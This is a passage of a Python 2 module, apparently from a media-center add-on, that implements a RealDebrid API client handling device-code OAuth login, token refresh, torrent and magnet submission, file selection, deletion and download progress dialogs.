	StatusCompressing = 'compressing'
	StatusUploading = 'uploading'
	StatusDead = 'dead'

	# Categories
	CategoryUser = 'user'
	CategoryHosts = 'hosts'
	CategoryToken = 'token'
	CategoryDevice = 'device'
	CategoryUnrestrict = 'unrestrict'
	CategoryTorrents = 'torrents'
	CategoryTime = 'time'

	# Actions
	ActionStatus = 'status'
	ActionCode = 'code'
	ActionCredentials = 'credentials'
	ActionLink = 'link'
	ActionAddTorrent = 'addTorrent'
	ActionAddMagnet = 'addMagnet'
	ActionInfo = 'info'
	ActionAvailableHosts = 'availableHosts'
	ActionSelectFiles = 'selectFiles'
	ActionDelete = 'delete'

	# Parameters
	ParameterClientId = 'client_id'
	ParameterClientSecret = 'client_secret'
	ParameterCode = 'code'
	ParameterGrantType = 'grant_type'
	ParameterNewCredentials = 'new_credentials'
	ParameterLink = 'link'
	ParameterMagnet = 'magnet'
	ParameterFiles = 'files'

	# Errors
	ErrorUnknown = 'unknown'
	ErrorInaccessible = 'inaccessible' # Eg: 404 error.
	ErrorRealDebrid = 'realdebrid' # Error from RealDebrid server.

	# Selection
	SelectionAll = 'all'
	SelectionName = 'name'
	SelectionLargest = 'largest'

	# Timeouts
	# Number of seconds the requests should be cached.
	TimeoutServices = 1 # 1 hour
	TimeoutAccount = 0.17 # 10 min

	# Time
	TimeOffset = 0

	# User Agent
	UserAgent = tools.System.name() + ' ' + tools.System.version()

	# Client
	ClientId = 'M1dXWERQQjRPSUhWVQ=='.decode('base64')
	ClientGrant = 'http://oauth.net/grant_type/device/1.0'

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		Debrid.__init__(self, 'RealDebrid')

		self._accountAuthenticationClear()
		self.mAuthenticationToken = self.accountToken()

		self.mLinkBasic = None
		self.mLinkFull = None
		self.mParameters = None
		self.mSuccess = None
		self.mError = None
		self.mResult = None

	##############################################################################
	# INTERNAL
	##############################################################################

	def _request(self, mode, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None, httpAuthenticate = True):
		self.mResult = None

		linkOriginal = link
		parametersOriginal = parameters
		httpDataOriginal = httpData

		def redo(mode, link, parameters, httpTimeout, httpData, httpHeaders, httpAuthenticate):
			if httpAuthenticate:
				tools.Logger.log('The RealDebrid token expired. Retrying the request with a refreshed token: ' + str(link))
				if self._accountAuthentication():
					httpHeaders['Authorization'] = 'Bearer %s' % self.mAuthenticationToken # Update token in headers.
					return self._request(mode = mode, link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpAuthenticate = False)
			return None

		try:
			if not httpTimeout:
				if httpData: httpTimeout = 60
				else: httpTimeout = 30

			self.mLinkBasic = link
			self.mParameters = parameters
			self.mSuccess = None
			self.mError = None

			if mode == self.ModeGet or mode == self.ModePut or mode == self.ModeDelete:
				if parameters:
					if not link.endswith('?'):
						link += '?'
					parameters = urllib.urlencode(parameters, doseq = True)
					link += parameters
			elif mode == self.ModePost:
				if parameters:
					httpData = urllib.urlencode(parameters, doseq = True)

			self.mLinkFull = link

			if httpData: request = urllib2.Request(link, data = httpData)
			else: request = urllib2.Request(link)

			if mode == self.ModePut or mode == self.ModeDelete:
				request.get_method = lambda: mode.upper()

			request.add_header('User-Agent', self.UserAgent)
			if httpHeaders:
				for key in httpHeaders:
					request.add_header(key, httpHeaders[key])

			response = urllib2.urlopen(request, timeout = httpTimeout)
			self.mResult = response.read()
			response.close()

			try: self.mResult = json.loads(self.mResult)
			except: pass

			self.mSuccess = self._success(self.mResult)
			self.mError = self._error(self.mResult)
			if not self.mSuccess:
				if self.mError == 'bad_token' and httpAuthenticate:
					return redo(mode = mode, link = linkOriginal, parameters = parametersOriginal, httpTimeout = httpTimeout, httpData = httpDataOriginal, httpHeaders = httpHeaders, httpAuthenticate = httpAuthenticate)
				else:
					self._requestErrors('The call to the RealDebrid API failed', link, httpData, self.mResult)

		except urllib2.URLError as error:
			self.mSuccess = False
			self.mError = 'RealDebrid Unreachable [HTTP Error %s]' % str(error.code)
			self._requestErrors(self.mError, link, httpData, self.mResult)
			if self.mError == 'bad_token' or error.code == 401:
				return redo(mode = mode, link = linkOriginal, parameters = parametersOriginal, httpTimeout = httpTimeout, httpData = httpDataOriginal, httpHeaders = httpHeaders, httpAuthenticate = httpAuthenticate)
		except:
			self.mSuccess = False
			self.mError = 'Unknown Error'
			self._requestErrors(self.mError, link, httpData, self.mResult)
		return self.mResult

	def _requestErrors(self, message, link, payload, result = None):
		link = str(link)
		payload = str(payload) if len(str(payload)) < 300 else 'Payload too large to display'
		result = str(result)
		tools.Logger.error(str(message) + (': Link [%s] Payload [%s] Result [%s]' % (link, payload, result)))

	def _requestAuthentication(self, mode, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None):
		if not parameters:
			parameters = {}
		if not httpHeaders:
			httpHeaders = {}
		httpHeaders['Authorization'] = 'Bearer %s' % self.mAuthenticationToken
		return self._request(mode = mode, link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	def _retrieve(self, mode, category, action = None, id = None, link = None, magnet = None, files = None, httpTimeout = None, httpData = None, httpHeaders = None):
		linkApi = network.Networker.linkJoin(self.LinkApi, category, action)
		if not id == None: linkApi = network.Networker.linkJoin(linkApi, id)

		parameters = {}
		if not link == None: parameters[self.ParameterLink] = link
		if not magnet == None: parameters[self.ParameterMagnet] = magnet
		if not files == None: parameters[self.ParameterFiles] = files

		return self._requestAuthentication(mode = mode, link = linkApi, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	##############################################################################
	# SUCCESS
	##############################################################################

	def _success(self, result):
		return not 'error' in result

	def _error(self, result):
		return result['error'] if 'error' in result else None

	def success(self):
		return self.mSuccess

	def error(self):
		return self.mError

	##############################################################################
	# WEBSITE
	##############################################################################

	@classmethod
	def website(self, open = False):
		link = tools.Settings.getString('link.realdebrid', raw = True)
		if open: tools.System.openLink(link)
		return link

	##############################################################################
	# ACCOUNT
	##############################################################################

	def _accountAuthenticationClear(self):
		self.mAuthenticationLink = None
		self.mAuthenticationUser = None
		self.mAuthenticationDevice = None
		self.mAuthenticationInterval = None
		self.mAuthenticationId = None
		self.mAuthenticationSecret = None
		self.mAuthenticationToken = None
		self.mAuthenticationRefresh = None
		self.mAuthenticationUsername = None

	def _accountAuthenticationSettings(self):
		id = '' if self.mAuthenticationId == None else self.mAuthenticationId
		secrect = '' if self.mAuthenticationSecret == None else self.mAuthenticationSecret
		token = '' if self.mAuthenticationToken == None else self.mAuthenticationToken
		refresh = '' if self.mAuthenticationRefresh == None else self.mAuthenticationRefresh
		authentication = ''
		if not self.mAuthenticationToken == None:
			if self.mAuthenticationUsername == None or self.mAuthenticationUsername == '':
				authentication = '*************'
			else:
				authentication = self.mAuthenticationUsername

		tools.Settings.set('accounts.debrid.realdebrid.id', id)
		tools.Settings.set('accounts.debrid.realdebrid.secret', secrect)
		tools.Settings.set('accounts.debrid.realdebrid.token', token)
		tools.Settings.set('accounts.debrid.realdebrid.refresh', refresh)
		tools.Settings.set('accounts.debrid.realdebrid.auth', authentication)

	def _accountAuthentication(self):
		try:
			link = network.Networker.linkJoin(self.LinkAuthentication, self.CategoryToken)
			parameters = {
				self.ParameterClientId : self.accountId(),
				self.ParameterClientSecret : self.accountSecret(),
				self.ParameterCode : self.accountRefresh(),
				self.ParameterGrantType : self.ClientGrant
			}

			result = self._request(mode = self.ModePost, link = link, parameters = parameters, httpTimeout = 20, httpAuthenticate = False)

			if not result or 'error' in result or not 'access_token' in result:
				return False

			self.mAuthenticationToken = result['access_token']
			tools.Settings.set('accounts.debrid.realdebrid.token', self.mAuthenticationToken)
			return True
		except:
			return False

	def accountAuthenticationLink(self):
		return self.mAuthenticationLink

	def accountAuthenticationCode(self):
		return self.mAuthenticationUser

	def accountAuthenticationInterval(self):
		return self.mAuthenticationInterval

	def accountAuthenticationReset(self, save = True):
		self._accountAuthenticationClear()
		if save: self._accountAuthenticationSettings()

	def accountAuthenticationStart(self):
		self._accountAuthenticationClear()

		try:
			link = network.Networker.linkJoin(self.LinkAuthentication, self.CategoryDevice, self.ActionCode)
			parameters = {
				self.ParameterClientId : self.ClientId,
				self.ParameterNewCredentials : 'yes'
			}

			result = self._request(mode = self.ModeGet, link = link, parameters = parameters, httpTimeout = 30, httpAuthenticate = False)

			self.mAuthenticationLink = result['verification_url']
			self.mAuthenticationUser = result['user_code']
			self.mAuthenticationDevice = result['device_code']
			self.mAuthenticationInterval = result['interval']

			return True
		except:
			tools.Logger.error()

		return False

	def accountAuthenticationWait(self):
		try:
			link = network.Networker.linkJoin(self.LinkAuthentication, self.CategoryDevice, self.ActionCredentials)
			parameters = {
				self.ParameterClientId : self.ClientId,
				self.ParameterCode : self.mAuthenticationDevice
			}

			result = self._request(mode = self.ModeGet, link = link, parameters = parameters, httpTimeout = 30, httpAuthenticate = False)

			if 'client_secret' in result:
				self.mAuthenticationId = result['client_id']
				self.mAuthenticationSecret = result['client_secret']
				return True
		except:
			pass

		return False

	def accountAuthenticationFinish(self):
		try:
			link = network.Networker.linkJoin(self.LinkAuthentication, self.CategoryToken)
			parameters = {
				self.ParameterClientId : self.mAuthenticationId,
				self.ParameterClientSecret : self.mAuthenticationSecret,
				self.ParameterCode : self.mAuthenticationDevice,
				self.ParameterGrantType : self.ClientGrant
			}

			result = self._request(mode = self.ModePost, link = link, parameters = parameters, httpTimeout = 30, httpAuthenticate = False)

			if 'access_token' in result and 'refresh_token' in result:
				self.mAuthenticationToken = result['access_token']
				self.mAuthenticationRefresh = result['refresh_token']

				try:
					account = self.account()
					self.mAuthenticationUsername = account['user']
					if self.mAuthenticationUsername == None or self.mAuthenticationUsername == '':
						self.mAuthenticationUsername = account['email']
				except:
					self.mAuthenticationUsername = None

				self._accountAuthenticationSettings()
				return True
		except:
			tools.Logger.error()

		return False

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.realdebrid.enabled')

	def accountValid(self):
		return not self.accountId() == '' and not self.accountSecret() == '' and not self.accountToken() == '' and not self.accountRefresh() == ''

	def accountId(self):
		return tools.Settings.getString('accounts.debrid.realdebrid.id') if self.accountEnabled() else ''

	def accountSecret(self):
		return tools.Settings.getString('accounts.debrid.realdebrid.secret') if self.accountEnabled() else ''

	def accountToken(self):
		return tools.Settings.getString('accounts.debrid.realdebrid.token') if self.accountEnabled() else ''

	def accountRefresh(self):
		return tools.Settings.getString('accounts.debrid.realdebrid.refresh') if self.accountEnabled() else ''

	def accountVerify(self):
		return not self.account(cache = False) == None

	def account(self, cache = True):
		try:
			if self.accountValid():
				timeout = self.TimeoutAccount if cache else 0
				def __realdebridAccount(): # Must have a different name than the tools.Cache.cache call for the hoster list. Otherwise the cache returns the result for the hosters instead of the account.
					return self._retrieve(mode = self.ModeGet, category = self.CategoryUser)
				result = tools.Cache.cache(__realdebridAccount, timeout)

				#if not self.success(): # Do not use this, since it will be false for cache calls.
				if result and isinstance(result, dict) and 'id' in result and result['id']:
					expiration = result['expiration']
					index = expiration.find('.')
					if index >= 0: expiration = expiration[:index]
					expiration = expiration.strip().lower().replace('t', ' ')
					expiration = tools.Time.datetime(expiration, '%Y-%m-%d %H:%M:%S')

					return {
						'user' : result['username'],
						'id' : result['id'],
						'email' : result['email'],
						'type' : result['type'],
						'locale' : result['locale'],
						'points' : result['points'],
						'expiration' : {
							'timestamp' : tools.Time.timestamp(expiration),
							'date' : expiration.strftime('%Y-%m-%d %H:%M:%S'),
							'remaining' : (expiration - datetime.datetime.today()).days
						}
					}
				else:
					return None
			else:
				return None
		except:
			tools.Logger.error()
			return None

	##############################################################################
	# SERVICES
	##############################################################################

	# If available is False, will return all services, including those that are currently down.
	def services(self, available = True, cache = True, onlyEnabled = False):
		# Even thow ServicesUpdate is a class variable, it will be destrcucted if there are no more Premiumize instances.
		if self.ServicesUpdate == None:
			self.ServicesUpdate = []

			streamingTorrent = self.streamingTorrent()
			streamingHoster = self.streamingHoster()

			try:
				timeout = self.TimeoutServices if cache else 0
				def __realdebridHosters():# Must have a different name than the tools.Cache.cache call for the account details. Otherwise the cache returns the result for the account instead of the hosters.
					return self._retrieve(mode = self.ModeGet, category = self.CategoryHosts, action = self.ActionStatus)
				result = tools.Cache.cache(__realdebridHosters, timeout)

				for service in self.ServicesTorrent:
					service['enabled'] = streamingTorrent
					self.ServicesUpdate.append(service)

				for key, value in result.iteritems():
					if not available or value['status'] == self.ServiceStatusUp:
						self.ServicesUpdate.append({
							'name' : value['name'],
							'id' : key.lower(),
							'identifier' : value['id'],
							'enabled' : streamingHoster,
							'domain' : key,
							'status' : value['status'],
							'supported' : value['supported'] == 1
						})
			except:
				tools.Logger.error()

		if onlyEnabled:
			return [i for i in self.ServicesUpdate if i['enabled']]
		else:
			return self.ServicesUpdate

	def servicesList(self, onlyEnabled = False):
		services = self.services(onlyEnabled = onlyEnabled)
		return [service['id'] for service in services]

	def service(self, nameOrDomain):
		nameOrDomain = nameOrDomain.lower()
		for service in self.services():
			if service['name'].lower() == nameOrDomain or service['domain'].lower() == nameOrDomain:
				return service
		return None

	##############################################################################
	# ADD
	##############################################################################

	def add(self, link, title = None, season = None, episode = None, source = None):
		container = network.Container(link)
		if source == network.Container.TypeTorrent:
			type = network.Container.TypeTorrent
		else:
			type = container.type()
		if type == network.Container.TypeTorrent:
			try:
				hash = container.hash()
				if not hash: raise Exception()
				exisitng = self._itemHash(hash, season = season, episode = episode)
				if not exisitng: raise Exception()
				link = exisitng['id']
			except:
				link = self.addTorrent(link = link, title = title)
		else:
			link = self.addHoster(link)
		return link

	def addContainer(self, link, title = None):
		try:
			source = network.Container(link).information()
			if source['path'] == None and source['data'] == None:
				return self.ErrorInaccessible

			data = source['data']
			result = self._retrieve(mode = self.ModePut, category = self.CategoryTorrents, action = self.ActionAddTorrent, httpData = data)

			if self.success() and 'id' in result:
				return result['id']
			else:
				return self.ErrorRealDebrid
		except:
			tools.Logger.error()
			return self.ErrorRealDebrid

	def addHoster(self, link):
		result = self._retrieve(mode = self.ModePost, category = self.CategoryUnrestrict, action = self.ActionLink, link = link)
		if self.success() and 'download' in result:
			return result['download']
		else:
			return self.ErrorRealDebrid

	def addTorrent(self, link, title = None):
		container = network.Container(link)
		source = container.information()
		if source['magnet']:
			magnet = container.torrentMagnet(title = title, encode = True)
			result = self._retrieve(mode = self.ModePost, category = self.CategoryTorrents, action = self.ActionAddMagnet, magnet = magnet)
			if self.success() and 'id' in result:
				return result['id']
			else:
				return self.ErrorRealDebrid
		else:
			return self.addContainer(link = link, title = title)

	##############################################################################
	# SELECT
	##############################################################################

	# Selects the files in the torrent to download.
	# files can be an id, a list of ids, or a Selection type.
	def select(self, id, files, item = None, season = None, episode = None):
		try:
			if files == self.SelectionAll:
				files = self.SelectionAll
			elif files == self.SelectionName:
				if item == None:
					item = self.item(id)
				largest = None
				meta = metadata.Metadata()
				if item and 'files' in item:
					for file in item['files']:
						if meta.episodeContains(title = file['path'], season = season, episode = episode):
							if largest == None or file['size']['bytes'] > largest['size']['bytes']:
								largest = file
				if largest == None:
					return False
				else:
					files = str(largest['id'])
			elif files == self.SelectionLargest:
				if item == None:
					item = self.item(id)
				if item and 'files' in item:
					largestId = None
					largestSize = 0
					for file in item['files']:
						size = file['size']['bytes']
						if size > largestSize:
							largestSize = size
							largestId = file['id']
					if largestId == None:
						return False
					else:
						files = str(largestId)
				else:
					return False
			elif not isinstance(files, basestring):
				if isinstance(files, list):
					files = ','.join(files)
				else:
					files = str(files)
			result = self._retrieve(mode = self.ModePost, category = self.CategoryTorrents, action = self.ActionSelectFiles, id = id, files = files)
			if self.success():
				return True
			else:
				return self.ErrorRealDebrid
		except:
			# If there are no seeders and RealDebrid cannot retrieve a list of files.
			return self.ErrorRealDebrid

	def selectAll(self, id):
		return self.select(id = id, files = self.SelectionAll)

	def selectName(self, id, item = None, season = None, episode = None):
		return self.select(id = id, files = self.SelectionName, item = item, season = season, episode = episode)

	def selectLargest(self, id, item = None):
		return self.select(id = id, files = self.SelectionLargest, item = item)

	##############################################################################
	# DELETE
	##############################################################################

	def delete(self, id):
		result = self._retrieve(mode = self.ModeDelete, category = self.CategoryTorrents, action = self.ActionDelete, id = id)
		if self.success():
			return True
		else:
			return self.ErrorRealDebrid

	def deleteAll(self, wait = True):
		items = self.items()
		if isinstance(items, list):
			if len(items) > 0:
				def _deleteAll(id):
					RealDebrid().delete(id)
				threads = []
				for item in items:
					threads.append(threading.Thread(target = _deleteAll, args = (item['id'],)))

				# Complete the first thread in case the token has to be refreshed.
				threads[0].start()
				threads[0].join()

				for i in range(1, len(threads)):
					threads[i].start()
				if wait:
					for i in range(1, len(threads)):
						threads[i].join()
			return True
		else:
			return self.ErrorRealDebrid

	# Delete on playback ended
	def deletePlayback(self):
		try: # May fail, because the setting was previously a boolean.
			if tools.Settings.getInteger('accounts.debrid.realdebrid.clear') == 1:
				self.deleteAll(wait = False)
		except: pass

	# Delete on launch
	def deleteLaunch(self):
		try: # May fail, because the setting was previously a boolean.
			if tools.Settings.getInteger('accounts.debrid.realdebrid.clear') == 2:
				self.deleteAll(wait = False)
		except: pass

	##############################################################################
	# TIME
	##############################################################################

	def timeOffset(self):
		def __realdebridTime():
			timeServer = self._retrieve(mode = self.ModeGet, category = self.CategoryTime)
			timeServer = convert.ConverterTime(timeServer, format = convert.ConverterTime.FormatDateTime).timestamp()
			timeUtc = tools.Time.timestamp()
			timeOffset = timeServer - timeUtc
			self.TimeOffset = int(3600 * round(timeOffset / float(3600))) # Round to the nearest hour
			return self.TimeOffset
		return tools.Cache.cache(__realdebridTime, 43200)

	##############################################################################
	# ITEMS
	##############################################################################

	def _itemHash(self, hash, season = None, episode = None):
		try:
			hash = hash.lower()
			items = self.items()
			meta = metadata.Metadata()
			for item in items:
				if item['hash'].lower() == hash:
					# Also check for the season/episode for season packs.
					# Otherwise RealDebrid will always return the first ever episode downloaded in the pack, since the hash for the torrent is the same.
					# Force to download again, if the episode does not match, that is a different episode is selected from the season pack.
					if meta.episodeContains(title = item['name'], season = season, episode = episode):
						return item
		except:
			pass
		return None

	def _item(self, dictionary):
		result = {}
		try:
			status = dictionary['status']
			sizeBytes = dictionary['bytes']
			if sizeBytes == 0: # Seems to be a bug in RealDebrid that sometimes the size shows up as 0. Use the largest file instead.
				if 'files' in dictionary:
					for file in dictionary['files']:
						size = file['bytes']
						if size > sizeBytes: sizeBytes = size
				if sizeBytes == 0 and 'original_bytes' in dictionary:
					sizeBytes = dictionary['original_bytes']
			size = convert.ConverterSize(value = sizeBytes, unit = convert.ConverterSpeed.Byte)

			split = convert.ConverterSize(value = dictionary['split'], unit = convert.ConverterSpeed.ByteGiga)
			speed = convert.ConverterSpeed(value = dictionary['speed'] if 'speed' in dictionary else 0, unit = convert.ConverterSpeed.Byte)

			offset = self.timeOffset()
			started = convert.ConverterTime(value = dictionary['added'], format = convert.ConverterTime.FormatDateTimeJson, offset = offset)
			if 'ended' in dictionary:
				finished = convert.ConverterTime(value = dictionary['ended'], format = convert.ConverterTime.FormatDateTimeJson, offset = offset)
				# RealDebrid seems to do caching in the background. In such a case, the finished time might be before the started time, since it was previously downloaded by another user.
				if finished.timestamp() < started.timestamp():
					finished = started
			else:
				finished = None

			seeders = dictionary['seeders'] if 'seeders' in dictionary else 0

			completedProgress = dictionary['progress'] / 100.0
			completedBytes = int(sizeBytes * completedProgress)
			completedSize = convert.ConverterSize(value = completedBytes, unit = convert.ConverterSpeed.Byte)
			if finished == None:
				difference = tools.Time.timestamp() - started.timestamp()
			else: difference = finished.timestamp() - started.timestamp()
			completedDuration = convert.ConverterDuration(value = difference, unit = convert.ConverterDuration.UnitSecond)
			completedSeconds = completedDuration.value(convert.ConverterDuration.UnitSecond)

			remainingProgress = 1 - completedProgress
			remainingBytes = sizeBytes - completedBytes
			remainingSize = convert.ConverterSize(value = remainingBytes, unit = convert.ConverterSpeed.Byte)
			remainingSeconds = int(remainingBytes * (completedSeconds / float(completedBytes))) if completedBytes > 0 else 0
			remainingDuration = convert.ConverterDuration(value = remainingSeconds, unit = convert.ConverterDuration.UnitSecond)

			result = {
				'id' : dictionary['id'],
				'hash' : dictionary['hash'],
				'name' : dictionary['filename'],
				'type' : self.TypeTorrent,
				'status' : status,
				'host' : dictionary['host'],
				'time' : {
					'started' : started.string(convert.ConverterTime.FormatDateTime),
					'finished' : finished.string(convert.ConverterTime.FormatDateTime) if finished else None
				},
				'size' : {
					'bytes' : size.value(),
					'description' : size.stringOptimal()
				},
				'split' : {
					'bytes' : split.value(),
					'description' : split.stringOptimal()
				},
				'transfer' : {
					'speed' : {
						'bytes' : speed.value(convert.ConverterSpeed.Byte),
						'bits' : speed.value(convert.ConverterSpeed.Bit),
						'description' : speed.stringOptimal()
					},
					'torrent' : {
						'seeding' : status == self.StatusUploading,
						'seeders' : seeders,
					},
					'progress' : {
						'completed' : {
							'value' : completedProgress,
							'percentage' : int(completedProgress * 100),
							'size' : {
								'bytes' : completedSize.value(),
								'description' : completedSize.stringOptimal()
							},
							'time' : {
								'seconds' : completedDuration.value(convert.ConverterDuration.UnitSecond),
								'description' : completedDuration.string(convert.ConverterDuration.FormatDefault)
							}
						},
						'remaining' : {
							'value' : remainingProgress,
							'percentage' : int(remainingProgress * 100),
							'size' : {
								'bytes' : remainingSize.value(),
								'description' : remainingSize.stringOptimal()
							},
							'time' : {
								'seconds' : remainingDuration.value(convert.ConverterDuration.UnitSecond),
								'description' : remainingDuration.string(convert.ConverterDuration.FormatDefault)
							}
						}
					}
				}
			}

			# Link
			if 'links' in dictionary and len(dictionary['links']) > 0:
				result['link'] = dictionary['links'][0]
			else:
				result['link'] = None

			# Files
			if 'files' in dictionary and len(dictionary['files']) > 0:
				files = []
				for file in dictionary['files']:
					size = convert.ConverterSize(value = file['bytes'], unit = convert.ConverterSpeed.Byte)
					files.append({
						'id' : file['id'],
						'path' : file['path'],
						'selected' : tools.Converter.boolean(file['selected']),
						'size' : {
							'bytes' : size.value(),
							'description' : size.stringOptimal()
						}
					})
				result['files'] = files
			else:
				result['files'] = None

		except:
			tools.Logger.error()
			pass
		return result

	def items(self):
		results = self._retrieve(mode = self.ModeGet, category = self.CategoryTorrents)
		if self.success():
			items = []
			for result in results:
				items.append(self._item(result))
			return items
		else:
			return self.ErrorRealDebrid

	def item(self, id):
		result = self._retrieve(mode = self.ModeGet, category = self.CategoryTorrents, action = self.ActionInfo, id = id)
		if self.success():
			return self._item(result)
		else:
			return self.ErrorRealDebrid

	##############################################################################
	# DOWNLOAD
	##############################################################################

	def downloadHosts(self):
		results = self._retrieve(mode = self.ModeGet, category = self.CategoryTorrents, action = self.ActionAvailableHosts)
		if self.success():
			items = []
			for result in results:
				size = convert.ConverterSize(value = result['max_file_size'], unit = convert.ConverterSpeed.ByteGiga)
				items.append({
					'domain' : result['host'],
					'size' : {
						'bytes' : size.value(),
						'description' : size.stringOptimal()
					}
				})
			return items
		else:
			return self.ErrorRealDebrid

	def downloadInformation(self):
		items = self.items()
		if isinstance(items, list):
			count = len(items)
			countBusy = 0
			countFinished = 0
			countFailed = 0
			size = 0
			for item in items:
				size += item['size']['bytes']
				status = item['status']
				if status in [self.StatusUnknown, self.StatusError, self.StatusMagnetConversion, self.StatusVirus, self.StatusDead]:
					countFailed += 1
				elif status in [self.StatusFinished, self.StatusUploading]:
					countFinished += 1
				else:
					countBusy += 1
			size = convert.ConverterSize(value = size, unit = convert.ConverterSize.Byte)

			result = {
				'count' : {
					'total' : count,
					'busy' : countBusy,
					'finished' : countFinished,
					'failed' : countFailed,
				},
				'size' : {
					'bytes' : size.value(),
					'description' : size.stringOptimal()
				}
			}

			hosts = self.downloadHosts()
			if isinstance(hosts, list) and len(hosts) > 0:
				result['host'] = hosts[0]

			return result
		else:
			return self.ErrorRealDebrid

class RealDebridInterface(object):

	Name = 'RealDebrid'
	Stop = False # Stop all threads

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		self.mDebrid = RealDebrid()

	##############################################################################
	# STOP
	##############################################################################

	# Not sure if this actually works from sources __init__.py
	@classmethod
	def stop(self):
		time.sleep(0.1) # Make sure that the Loader is visible if called just before this function. Otherwise Loader.visible() always returns false.
		visible = interface.Loader.visible()
		if not visible:
			interface.Loader.show()
		self.Stop = True
		time.sleep(0.7) # Must be just above the threads' timestep.
		self.Stop = False
		if not visible:
			interface.Loader.hide()

	##############################################################################
	# ACCOUNT
	##############################################################################

	def account(self):
		interface.Loader.show()
		valid = False
		title = self.Name + ' ' + interface.Translation.string(33339)
		if self.mDebrid.accountEnabled():
			account = self.mDebrid.account(cache = False)
			if account:
				valid = interface.Translation.string(33341) if self.mDebrid.accountValid() else interface.Translation.string(33342)
				user = account['user']
				id = str(account['id'])
				email = account['email']
				type = account['type'].capitalize()
				points = str(account['points'])

				date = account['expiration']['date']
				days = str(account['expiration']['remaining'])

				items = []

				# Information
				items.append({
					'title' : 33344,
					'items' : [
						{ 'title' : 33340, 'value' : valid },
						{ 'title' : 32305, 'value' : id },
						{ 'title' : 32303, 'value' : user },
						{ 'title' : 32304, 'value' : email },
						{ 'title' : 33343, 'value' : type },
						{ 'title' : 33349, 'value' : points }
					]
				})

				# Expiration
				items.append({
					'title' : 33345,
					'items' : [
						{ 'title' : 33346, 'value' : date },
						{ 'title' : 33347, 'value' : days }
					]
				})

				# Dialog
				interface.Loader.hide()
				interface.Dialog.information(title = title, items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = title, message = interface.Translation.string(33352) % self.Name)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = title, message = interface.Translation.string(33351) % self.Name)

		return valid

	def accountAuthentication(self, openSettings = True):
		interface.Loader.show()
		try:
			if self.mDebrid.accountValid():
				if interface.Dialog.option(title = self.Name, message = 33492):
					self.mDebrid.accountAuthenticationReset(save = False)
				else:
					return None

			self.mDebrid.accountAuthenticationStart()

			message = interface.Translation.string(33494) + interface.Format.newline()
			message += '     ' + interface.Translation.string(33381) + ': ' + interface.Format.fontBold(self.mDebrid.accountAuthenticationLink())
			message += interface.Format.newline()
			message += '     ' + interface.Translation.string(33495) + ': ' + interface.Format.fontBold(self.mDebrid.accountAuthenticationCode())
			message += interface.Format.newline() + interface.Translation.string(33978)

			clipboard.Clipboard.copy(self.mDebrid.accountAuthenticationCode())
			progressDialog = interface.Dialog.progress(title = self.Name, message = message, background = False)

			interval = self.mDebrid.accountAuthenticationInterval()
			timeout = 3600
			synchronized = False

			for i in range(timeout):
				try:
					try: canceled = progressDialog.iscanceled()
					except: canceled = False
					if canceled: break
					progressDialog.update(int((i / float(timeout)) * 100))

					if not float(i) % interval == 0:
						raise Exception()
					time.sleep(1)

					if self.mDebrid.accountAuthenticationWait():
						synchronized = True
						break
				except:
					pass

			try: progressDialog.close()
			except: pass

			if synchronized:
				self.mDebrid.accountAuthenticationFinish()
			else:
				self.mDebrid.accountAuthenticationReset(save = True) # Make sure the values are reset if the waiting dialog is canceled.
		except:
			pass
		if openSettings:
			tools.Settings.launch(category = tools.Settings.CategoryAccounts)
		interface.Loader.hide()

	##############################################################################
	# CLEAR
	##############################################################################

	def clear(self):
		title = self.Name + ' ' + interface.Translation.string(33013)
		message = 'Do you want to clear your RealDebrid downloads and delete all your files from the server?'
		if interface.Dialog.option(title = title, message = message):
			interface.Loader.show()
			self.mDebrid.deleteAll()
			interface.Loader.hide()
			message = 'RealDebrid Downloads Cleared'
			interface.Dialog.notification(title = title, message = message, icon = interface.Dialog.IconSuccess)

	##############################################################################
	# ADD
	##############################################################################

	def add(self, link, title = None, season = None, episode = None, close = True, source = None):
		id = self.mDebrid.add(link = link, title = title, season = season, episode = episode, source = source)
		if id == RealDebrid.ErrorInaccessible:
			title = 'Stream Error'
			message = 'The stream is inaccessible'
			self._addError(title = title, message = message)
			return None
		elif id == RealDebrid.ErrorRealDebrid:
			title = 'Stream Error'
			message = 'The stream could not be added to RealDebrid'
			self._addError(title = title, message = message)
			return None
		elif id == RealDebrid.ErrorUnknown or link == None or link == '':
			title = 'Stream Error'
			message = 'The stream is unavailable'
			self._addError(title = title, message = message)
			return None
		elif network.Networker.linkIs(id):
			return id
		else:
			return self._addWait(id = id, season = season, episode = episode, close = close)

	def _addAction(self, id, season = None, episode = None, close = True):
		def show(id, season, episode, close):
			items = []
			items.append(interface.Format.font(interface.Translation.string(33077) + ': ', bold = True) + interface.Translation.string(33078))
			items.append(interface.Format.font(interface.Translation.string(33079) + ': ', bold = True) + interface.Translation.string(33080))
			items.append(interface.Format.font(interface.Translation.string(33083) + ': ', bold = True) + interface.Translation.string(33084))
			choice = interface.Dialog.options(title = 33076, items = items)

			if choice == 0:
				self._addWait(id, season = season, episode = episode, close = close)
			if choice == 2:
				choice = interface.Dialog.option(title = 33076, message = 33983, labelDeny = 33984, labelConfirm = 33985)
				if choice: self.mDebrid.delete(id)
			else: # if choice is 1 or -1. -1: If the user hits the cancel button.
				return

		# Must be started in a thread, because _addLink calls this function, and this function calls _addLink again (if choice 0).
		# Hence there is a circular call, and the first _addLink never finishes while the inner _addLink still runs. Can create and infinite function call if the user constantly selects choice 0.
		thread = threading.Thread(target = show, args = (id, season, episode, close))
		thread.start()

	def _addError(self, title, message, delay = True):
		interface.Loader.hide() # Make sure hided from sources __init__.py
		interface.Dialog.notification(title = title, message = message, icon = interface.Dialog.IconError)
		if delay: time.sleep(2) # Otherwise the message disappears to quickley when another notification is shown afterwards.

	def _addErrorDetermine(self, item):
		status = item['status']
		if status == RealDebrid.StatusError:
			title = 'Download Error'
			message = 'The download failed with an unknown error'
			self._addError(title = title, message = message)
			return True
		elif status == RealDebrid.StatusMagnetError:
			title = 'Download Magnet'
